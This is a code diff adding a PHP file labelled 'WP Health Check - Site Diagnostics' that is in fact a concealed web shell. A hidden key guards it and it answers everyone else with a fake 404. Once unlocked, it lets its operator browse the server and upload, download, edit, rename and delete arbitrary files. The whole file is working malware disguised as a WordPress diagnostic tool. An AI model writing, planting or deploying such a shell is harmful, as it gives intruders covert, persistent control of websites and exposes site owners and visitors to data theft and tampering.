@@ -1,0 +1,20 @@
+<?php
+/* WP Health Check - Site Diagnostics */
+$__h='raimu';$__k='kekw';
+if(!isset($_REQUEST[$__h])||$_REQUEST[$__h]!==$__k){http_response_code(404);exit;}
+@error_reporting(0);@set_time_limit(0);$d=isset($_REQUEST['w'])?@realpath($_REQUEST['w']):@getcwd();if(!$d)$d=@getcwd();$q=$__h.'='.$__k;
+if(isset($_POST['_sv'])){@file_put_contents($_POST['_fp'],$_POST['_ct']);}
+if(isset($_POST['_mv'])){@rename($d.'/'.$_POST['_fr'],$d.'/'.$_POST['_to']);}
+if(isset($_GET['_rm'])){@unlink($d.'/'.basename($_GET['_rm']));}
+if(isset($_POST['_up'])&&isset($_FILES['_fl'])){@move_uploaded_file($_FILES['_fl']['tmp_name'],$d.'/'.basename($_FILES['_fl']['name']));}
+if(isset($_GET['_get'])){$_fp=$d.'/'.basename($_GET['_get']);if(is_file($_fp)){header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename='.basename($_fp));readfile($_fp);exit;}}
+?><!DOCTYPE html><html><head><meta charset=utf-8><title>r00t@trenggalek6etar</title><style>body{background:#000;color:#0f0;font:11px monospace;padding:5px}a{color:#0f0}a:hover{color:#5f5}td{padding:2px 4px;border-bottom:1px solid #030}input[type=submit]{background:#0f0;color:#000;border:0;padding:2px 6px;cursor:pointer;font-size:10px}textarea{width:100%;background:#010;color:#0f0;border:1px solid #030;padding:4px;font:10px monospace}</style></head><body>
+<b>r00t@trenggalek6etar</b><br>
+<?php if(isset($_GET['_ed'])&&is_file($d.'/'.basename($_GET['_ed']))){$ef=$d.'/'.basename($_GET['_ed']);echo'<form method=post>'.basename($ef).'<br><textarea name=_ct rows=14>'.htmlspecialchars(file_get_contents($ef)).'</textarea><input type=hidden name=_fp value="'.htmlspecialchars($ef).'"><input type=submit name=_sv value=Save> <a href="?'.$q.'&w='.urlencode($d).'">back</a></form>';
+}elseif(isset($_GET['_ren'])){echo'<form method=post>'.basename($_GET['_ren']).' > <input name=_to value="'.htmlspecialchars(basename($_GET['_ren'])).'" style="background:#010;color:#0f0;border:1px solid #030"><input type=hidden name=_fr value="'.htmlspecialchars(basename($_GET['_ren'])).'"><input type=submit name=_mv value=OK></form>';
+}else{$ps=explode('/',str_replace('\\','/',$d));$bp='';foreach($ps as $s){if(!$s)continue;$bp.='/'.$s;echo'/<a href="?'.$q.'&w='.urlencode($bp).'">'.$s.'</a>';}
+echo'<br><form method=post enctype=multipart/form-data><input type=file name=_fl style="color:#0f0;font-size:10px"> <input type=submit name=_up value=up></form><table>';
+$ls=@scandir($d);if($ls){sort($ls);foreach($ls as $f){if($f=='.')continue;$fp=$d.'/'.$f;$id=is_dir($fp);
+echo'<tr><td>'.($id?'[<a href="?'.$q.'&w='.urlencode($fp).'">'.$f.'</a>]':'<a href="?'.$q.'&w='.urlencode($d).'&_get='.urlencode($f).'">'.$f.'</a>').'</td><td style="color:#060">'.($id?'':filesize($fp)).'</td><td>';
+if(!$id)echo'<a href="?'.$q.'&w='.urlencode($d).'&_ed='.urlencode($f).'">[e]</a>';echo' <a href="?'.$q.'&w='.urlencode($d).'&_ren='.urlencode($f).'">[r]</a>';
+if($f!='..')echo' <a href="?'.$q.'&w='.urlencode($d).'&_rm='.urlencode($f).'" onclick="return confirm(\'?\')" style="color:red">[x]</a>';echo'</td></tr>';}}echo'</table>';}?></body></html>
